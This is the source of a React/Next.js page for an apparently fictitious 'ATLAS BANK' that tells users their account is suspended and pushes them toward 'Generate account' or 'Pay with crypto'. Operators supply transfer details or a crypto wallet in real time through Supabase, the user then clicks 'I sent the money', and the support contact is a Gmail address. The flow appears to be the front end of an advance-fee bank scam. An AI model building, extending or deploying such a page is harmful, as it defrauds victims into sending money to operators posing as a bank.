"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { DEMO_CUSTOMER_EMAIL } from "@/lib/adminData";
import { cancelPendingReviewRequest, fetchCustomerSuspensionByEmail, getNewUserSession, notifyAdminMoneySent, requestAccountGeneration, requestCryptoPayment } from "@/lib/newUserData";
import { supabase } from "@/lib/supabase";

export default function SuspensionContinuePage() {
  const router = useRouter();
  const [isGenerateModalOpen, setIsGenerateModalOpen] = useState(false);
  const [isCryptoModalOpen, setIsCryptoModalOpen] = useState(false);
  const [isRequesting, setIsRequesting] = useState(false);
  const [isRequestingCrypto, setIsRequestingCrypto] = useState(false);
  const [isAwaitingDetails, setIsAwaitingDetails] = useState(false);
  const [waitingRequestType, setWaitingRequestType] = useState<"account" | "crypto">("account");
  const [message, setMessage] = useState("");
  const [accountDetails, setAccountDetails] = useState("");
  const [isNotifyingMoneySent, setIsNotifyingMoneySent] = useState(false);
  const [isNewUser, setIsNewUser] = useState(false);

  useEffect(() => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    const customerEmail = email || DEMO_CUSTOMER_EMAIL;
    setIsNewUser(Boolean(session && customerEmail.toLowerCase() === session.customerEmail.toLowerCase()));

    const loadStatus = async () => {
      const customer = await fetchCustomerSuspensionByEmail(customerEmail);
      const nextAccountDetails = customer?.reviewRequest === "crypto_payment" || !customer?.accountDetails ? "" : customer.accountDetails;
      const hasCryptoValues = Boolean(customer?.cryptoName || customer?.cryptoAddress || customer?.cryptoPaymentTime);
      setAccountDetails(nextAccountDetails);
      setWaitingRequestType("account");
      setIsAwaitingDetails(false);

      if (hasCryptoValues && !nextAccountDetails) {
        window.setTimeout(() => {
          router.push("/suspension/crypto");
        }, 300);
      }
    };

    void loadStatus();
    const channel = supabase?.channel("customer-account-details")
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "customers", filter: `email=eq.${customerEmail}` }, (payload) => {
        const nextCustomer = payload.new as Record<string, unknown>;
        const details = nextCustomer.account_details;
        const reviewRequest = typeof nextCustomer.review_request === "string" ? nextCustomer.review_request : undefined;
        const hasAccountDetails = typeof details === "string" && details.trim().length > 0;
        const hasCryptoDetails = Boolean(
          (typeof nextCustomer.crypto_name === "string" && nextCustomer.crypto_name.trim()) ||
          (typeof nextCustomer.crypto_address === "string" && nextCustomer.crypto_address.trim()) ||
          (typeof nextCustomer.crypto_payment_time === "string" && nextCustomer.crypto_payment_time.trim())
        );

        if (hasAccountDetails) {
          setAccountDetails(details as string);
          setMessage("Your account details are ready.");
          setWaitingRequestType("account");
          setIsAwaitingDetails(false);
          return;
        }

        if (hasCryptoDetails) {
          setAccountDetails("");
          setMessage("Your crypto payment details are ready.");
          setWaitingRequestType("crypto");
          setIsAwaitingDetails(false);
          window.setTimeout(() => {
            router.push("/suspension/crypto");
          }, 300);
          return;
        }

        if (reviewRequest === "account_generation") {
          setAccountDetails("");
          setMessage("Your request has been sent. Please remain on standby while your account is generated.");
          setWaitingRequestType("account");
          setIsAwaitingDetails(true);
          return;
        }

        if (reviewRequest === "crypto_payment") {
          setAccountDetails("");
          setMessage("Your crypto payment request has been sent. The review team will share the wallet details with you.");
          setWaitingRequestType("crypto");
          setIsAwaitingDetails(true);
          return;
        }

        setAccountDetails("");
        setMessage("");
        setIsAwaitingDetails(false);
      })
      .subscribe();

    return () => {
      if (channel) void supabase?.removeChannel(channel);
    };
  }, []);

  const handleGenerateAccount = async () => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    if (!email) {
      setMessage("We could not identify your account. Please sign in again.");
      return;
    }

    setIsRequesting(true);
    setMessage("");
    try {
      await requestAccountGeneration(email);
      setIsGenerateModalOpen(false);
      setWaitingRequestType("account");
      setIsAwaitingDetails(true);
      setMessage("Your request has been sent. Please remain on standby while your account is generated.");
    } catch {
      setMessage("We could not send your request. Please try again or contact Customer Care.");
    } finally {
      setIsRequesting(false);
    }
  };

  const handleCancelPendingRequest = async () => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    if (!email) {
      setMessage("We could not identify your account. Please sign in again.");
      return;
    }

    try {
      await cancelPendingReviewRequest(email);
      setAccountDetails("");
      setMessage("Your pending request was cancelled. No admin notification was sent.");
      setIsAwaitingDetails(false);
      setWaitingRequestType("account");
      setIsGenerateModalOpen(false);
      setIsCryptoModalOpen(false);
    } catch {
      setMessage("We could not cancel your request. Please try again.");
    }
  };

  const handleNotifyMoneySent = async () => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    if (!email) {
      setMessage("We could not identify your account. Please sign in again.");
      return;
    }

    setIsNotifyingMoneySent(true);
    setMessage("");
    try {
      await notifyAdminMoneySent(email);
      setMessage("The admin has been notified that your money was sent.");
    } catch {
      setMessage("We could not notify the admin. Please try again.");
    } finally {
      setIsNotifyingMoneySent(false);
    }
  };

  const handleRequestCrypto = async () => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    if (!email) {
      setMessage("We could not identify your account. Please sign in again.");
      return;
    }

    setIsRequestingCrypto(true);
    setMessage("");
    try {
      await requestCryptoPayment(email);
      setIsCryptoModalOpen(false);
      setWaitingRequestType("crypto");
      setIsAwaitingDetails(true);
      setMessage("Your crypto payment request has been sent. The review team will share the wallet details with you.");
    } catch {
      setMessage("We could not send your crypto request. Please try again or contact Customer Care.");
    } finally {
      setIsRequestingCrypto(false);
    }
  };

  return (
    <main className="auth-layout suspension-page">
      <section className="auth-card suspension-card" aria-labelledby="suspension-next-step-title">
        <div className="auth-card-header">
          <strong className="auth-logo">ATLAS BANK</strong>
          <p className="eyebrow">Account review</p>
          <div className="suspension-review-mark" aria-hidden="true">2</div>
          <h1 id="suspension-next-step-title">Let&apos;s review your account</h1>
          <p>Your account access is paused while our team reviews the suspension. Either complete the following task or contact Customer Care to help you understand what happens next.</p>
        </div>

        <div className="suspension-review-list">
          <div><span>01</span><p><strong>Share your account details</strong>Contact Customer Care with the information they need.</p></div>
          <div><span>02</span><p><strong>Follow the review instructions</strong>Our team will guide the next step.</p></div>
          <div><span>03</span><p><strong>Wait for confirmation</strong>We will let you know when transfers are available again.</p></div>
        </div>

        <div className="suspension-choice-grid">
          <button className="suspension-choice" type="button" onClick={() => setIsGenerateModalOpen(true)}>
            <span className="suspension-choice-label">Transfer</span>
            <strong>Generate account</strong>
            <small>Request account details from our review team.</small>
          </button>
          <button className="suspension-choice" type="button" onClick={() => setIsCryptoModalOpen(true)}>
            <span className="suspension-choice-label">Digital payment</span>
            <strong>Pay with crypto</strong>
            <small>Request the wallet details and payment window from our team.</small>
          </button>
        </div>

        {message ? <p className="settings-note suspension-standby-message" role="status">{message}</p> : null}
        {accountDetails ? <div className="suspension-account-details"><span>Account details received</span><p>{accountDetails}</p></div> : null}
        {accountDetails ? <div className="suspension-money-action"><div><span className="suspension-action-kicker">Next step</span><strong>Have you sent the funds?</strong><small>Let the review team know so they can check your account.</small></div><button className="primary-btn" type="button" onClick={handleNotifyMoneySent} disabled={isNotifyingMoneySent}>{isNotifyingMoneySent ? "Notifying admin..." : "I sent the money"}</button></div> : null}

        <div className="form-actions suspension-actions">
          <a className="primary-btn" href="mailto:workdaysupport.novatech@gmail.com?subject=Atlas%20Bank%20account%20review&body=Hello%20Atlas%20Bank%20Support%2C%0A%0AI%20would%20like%20to%20request%20a%20review%20of%20my%20suspended%20account.">Email Customer Care</a>
          <button className="secondary-btn" type="button" onClick={() => router.back()}>Back</button>
        </div>
      </section>
      {isGenerateModalOpen ? (
        <div className="transfer-code-overlay" role="presentation" onMouseDown={() => setIsGenerateModalOpen(false)}>
          <section className="transfer-code-modal suspension-request-modal" role="dialog" aria-modal="true" aria-labelledby="generate-account-title" onMouseDown={(event) => event.stopPropagation()}>
            <p className="eyebrow">Transfer review</p>
            <h2 id="generate-account-title">Generate account details?</h2>
            <p className="transfer-code-copy">We will notify the review team. Keep this page open while your account details are being generated.</p>
            <div className="form-actions">
              <button className="secondary-btn" type="button" onClick={() => setIsGenerateModalOpen(false)}>Cancel</button>
              <button className="primary-btn" type="button" onClick={handleGenerateAccount} disabled={isRequesting}>{isRequesting ? "Sending request..." : "Generate account"}</button>
            </div>
          </section>
        </div>
      ) : null}

      {isAwaitingDetails ? (
        <div className="transfer-code-overlay" role="presentation">
          <section className="transfer-code-modal suspension-request-modal" role="dialog" aria-modal="true" aria-labelledby="waiting-request-title">
            <p className="eyebrow">{waitingRequestType === "account" ? "Account generation" : "Crypto payment"}</p>
            <h2 id="waiting-request-title">{waitingRequestType === "account" ? "Generating account" : "Waiting for crypto payment details"}</h2>
            <p className="transfer-code-copy">{waitingRequestType === "account" ? "Estimated time: 30 seconds to 1 minute while the review team prepares your account details." : "Estimated time: 30 seconds to 1 minute while the review team prepares your crypto payment details."}</p>
            <div className="form-actions">
              <button className="secondary-btn" type="button" onClick={handleCancelPendingRequest}>Cancel request</button>
            </div>
          </section>
        </div>
      ) : null}

      {isCryptoModalOpen ? (
        <div className="transfer-code-overlay" role="presentation" onMouseDown={() => setIsCryptoModalOpen(false)}>
          <section className="transfer-code-modal suspension-request-modal" role="dialog" aria-modal="true" aria-labelledby="request-crypto-title" onMouseDown={(event) => event.stopPropagation()}>
            <p className="eyebrow">Digital payment</p>
            <h2 id="request-crypto-title">Request crypto payment details?</h2>
            <p className="transfer-code-copy">We will notify the review team to send the wallet address, crypto name, and payment window.</p>
            <div className="form-actions">
              <button className="secondary-btn" type="button" onClick={() => setIsCryptoModalOpen(false)}>Cancel</button>
              <button className="primary-btn" type="button" onClick={handleRequestCrypto} disabled={isRequestingCrypto}>{isRequestingCrypto ? "Sending request..." : "Request crypto details"}</button>
            </div>
          </section>
        </div>
      ) : null}
    </main>
  );
}
